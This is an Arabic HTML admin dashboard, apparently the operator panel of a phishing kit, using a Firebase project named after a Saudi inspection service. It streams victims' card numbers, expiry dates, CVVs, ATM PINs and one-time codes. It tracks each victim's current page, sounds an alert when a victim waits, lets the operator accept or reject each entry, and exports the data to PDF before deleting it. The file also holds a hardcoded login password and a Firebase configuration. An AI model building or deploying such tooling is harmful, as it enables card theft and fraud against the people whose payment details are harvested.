<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - نظام الكروت الذكي</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; color: #333; margin: 0; padding: 0; }
        .navbar { background: #1e7344; padding: 12px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .nav-btn { background: rgba(255,255,255,0.2); border: none; color: white; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .nav-btn.active { background: white; color: #1e7344; }
        
        .visitor-counter { background: #ffd700; color: #000; padding: 8px; text-align: center; font-weight: bold; font-size: 13px; }
        
        /* زر حفظ PDF الجديد */
        .pdf-export-btn { background: #d32f2f; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-right: 10px; }
        .pdf-export-btn:hover { background: #b71c1c; }

        .container { padding: 15px; display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }
        
        /* تصميم الكرت المستقل */
        .client-card { 
            background: white; border-radius: 15px; padding: 15px; 
            box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #e0e0e0;
            position: relative; transition: 0.3s;
        }
        .is-active-row { border: 2px solid #28a745 !important; animation: glow 1.5s infinite; }
        @keyframes glow { 0% { box-shadow: 0 0 5px #28a745; } 50% { box-shadow: 0 0 20px #28a745; } 100% { box-shadow: 0 0 5px #28a745; } }

        .card-header { border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
        .client-name { font-weight: bold; color: #1e7344; font-size: 16px; }
        .client-location { background: #e3f2fd; color: #1976d2; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; }

        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .info-item { background: #f8f9fa; padding: 8px; border-radius: 8px; }
        .info-label { font-size: 10px; color: #888; display: block; margin-bottom: 2px; }
        .info-val { font-family: monospace; font-weight: bold; font-size: 14px; color: #000; }

        .full-width { grid-column: span 2; }
        .ltr { direction: ltr; display: inline-block; }

        .card-actions { margin-top: 15px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .btn { padding: 10px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; background: #eee; color: #999; }
        .btn-green.highlight { background: #28a745 !important; color: white !important; }
        .btn-red.highlight { background: #dc3545 !important; color: white !important; }

        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
        .login-card { background: white; padding: 30px; border-radius: 15px; text-align: center; width: 300px; }
    </style>
</head>
<body onload="checkSavedLogin()">

<audio id="alertSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

<div id="loginOverlay">
    <div class="login-card">
        <h2 style="color: #1e7344;">تسجيل دخول</h2>
        <input type="password" id="password" placeholder="كلمة المرور" style="width:100%; padding:12px; margin:15px 0; border:1px solid #ddd; border-radius:8px; text-align:center;">
        <button onclick="checkLogin()" style="width:100%; padding:12px; background:#1e7344; color:white; border:none; border-radius:8px; font-weight:bold;">دخول</button>
    </div>
</div>

<div id="adminContent" style="display:none;">
    <div class="visitor-counter">🌐 المتواجدون الآن: <span id="onlineCount">0</span></div>
    <div class="navbar">
        <button class="nav-btn active">💳 العمليات المباشرة</button>
        <button class="pdf-export-btn" onclick="exportDataToPDF()">حفظ العمليات PDF ومسحها</button>
        <button class="nav-btn" onclick="logout()" style="background:#333">🚪 خروج</button>
    </div>

    <div class="container" id="cardsList">
        </div>
</div>

<script>
    function checkSavedLogin() { if (localStorage.getItem("admin_logged_in") === "true") showAdmin(); }
    function checkLogin() { if(document.getElementById('password').value === "H0987654H") { localStorage.setItem("admin_logged_in", "true"); showAdmin(); } }
    function showAdmin() { document.getElementById('loginOverlay').style.display = 'none'; document.getElementById('adminContent').style.display = 'block'; initFirebase(); }
    function logout() { localStorage.removeItem("admin_logged_in"); location.reload(); }
    function playSound() { document.getElementById('alertSound').play().catch(e => {}); }

    let database;

    function initFirebase() {
        const firebaseConfig = {
            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT8X6X8X6X8",
            authDomain: "saso-inspection.firebaseapp.com",
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
            projectId: "saso-inspection"
        };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        database = firebase.database();

        // تحديث عدد الزوار
        database.ref('live_visitors').on('value', s => {
            let active = 0; const now = Date.now();
            s.forEach(c => { if(now - c.val().last_active < 30000) active++; });
            document.getElementById('onlineCount').innerText = active;
        });

        // مراقبة مكان العميل (الصفحة التي يقف عليها)
        database.ref('live_visitors').on('child_changed', s => {
            const visitorId = s.key;
            const data = s.val();
            const badge = document.querySelector(`#card_${visitorId} .client-location`);
            if(badge) badge.innerText = data.page || "غير معروف";
        });

        // إضافة الكروت
        database.ref('payments').on('child_added', s => { renderCard(s.key, s.val()); });
        
        // تحديث الكروت عند تغيير البيانات
        database.ref('payments').on('child_changed', s => {
            const val = s.val();
            const card = document.getElementById('card_' + s.key);
            if(card) {
                card.querySelector('.val-card').innerText = val.cardNumber;
                card.querySelector('.val-expiry').innerText = val.expiry;
                card.querySelector('.val-cvv').innerText = val.cvv;
                card.querySelector('.val-pin').innerText = val.atm_pin || '-';
                card.querySelector('.val-otp').innerText = val.otp || '-';

                if(val.status && val.status.includes('waiting')) {
                    card.classList.add('is-active-row');
                    card.querySelectorAll('.btn').forEach(b => b.classList.add('highlight'));
                    playSound();
                } else {
                    card.classList.remove('is-active-row');
                    card.querySelectorAll('.btn').forEach(b => b.classList.remove('highlight'));
                }
            }
        });

        // مراقبة الحذف الفعلي من قاعدة البيانات لتحديث الواجهة فوراً
        database.ref('payments').on('child_removed', s => {
            const card = document.getElementById('card_' + s.key);
            if(card) card.remove();
        });
    }

    function renderCard(key, val) {
        if(document.getElementById('card_' + key)) return;
        const list = document.getElementById('cardsList');
        const activeClass = (val.status && val.status.includes('waiting')) ? 'highlight' : '';
        const glowClass = (val.status && val.status.includes('waiting')) ? 'is-active-row' : '';

        const div = document.createElement('div');
        div.id = 'card_' + key;
        div.className = `client-card ${glowClass}`;
        div.innerHTML = `
            <div class="card-header">
                <span class="client-name">${val.cardHolder || 'عميل جديد'}</span>
                <span class="client-location">جاري التتبع...</span>
            </div>
            <div class="info-grid">
                <div class="info-item full-width">
                    <span class="info-label">رقم البطاقة</span>
                    <span class="info-val ltr val-card">${val.cardNumber}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">الانتهاء</span>
                    <span class="info-val ltr val-expiry">${val.expiry}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">CVV</span>
                    <span class="info-val ltr val-cvv">${val.cvv}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">PIN الصراف</span>
                    <span class="info-val ltr val-pin" style="color:#9c27b0;">${val.atm_pin || '-'}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">رمز OTP</span>
                    <span class="info-val ltr val-otp" style="color:#2196f3;">${val.otp || '-'}</span>
                </div>
            </div>
            <div class="card-actions">
                <button class="btn btn-green ${activeClass}" onclick="updateStat('${key}', 'accept')">قبول</button>
                <button class="btn btn-red ${activeClass}" onclick="updateStat('${key}', 'reject')">رفض</button>
            </div>
        `;
        list.prepend(div);
    }

    function updateStat(id, action) { 
        firebase.database().ref('payments/' + id).update({ status: action }); 
    }

    // وظيفة تصدير الـ PDF ومسح البيانات
    async function exportDataToPDF() {
        const element = document.getElementById('cardsList');
        if (element.children.length === 0) {
            alert("لا توجد بيانات لتصديرها.");
            return;
        }

        if (confirm("سيتم حفظ العمليات في ملف PDF ومسحها نهائياً من اللوحة. هل أنت متأكد؟")) {
            const opt = {
                margin: 10,
                filename: 'العمليات_المباشرة_' + new Date().toLocaleDateString() + '.pdf',
                image: { type: 'jpeg', quality: 0.98 },
                html2canvas: { scale: 2, useCORS: true },
                jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
            };

            // البدء في عملية التحويل والحفظ
            html2pdf().set(opt).from(element).save().then(() => {
                // بعد انتهاء الحفظ، نقوم بمسح البيانات من Firebase
                database.ref('payments').remove()
                .then(() => {
                    alert("تم حفظ الملف ومسح البيانات بنجاح.");
                })
                .catch((error) => {
                    console.error("خطأ أثناء مسح البيانات: ", error);
                });
            });
        }
    }
</script>
</body>
</html>
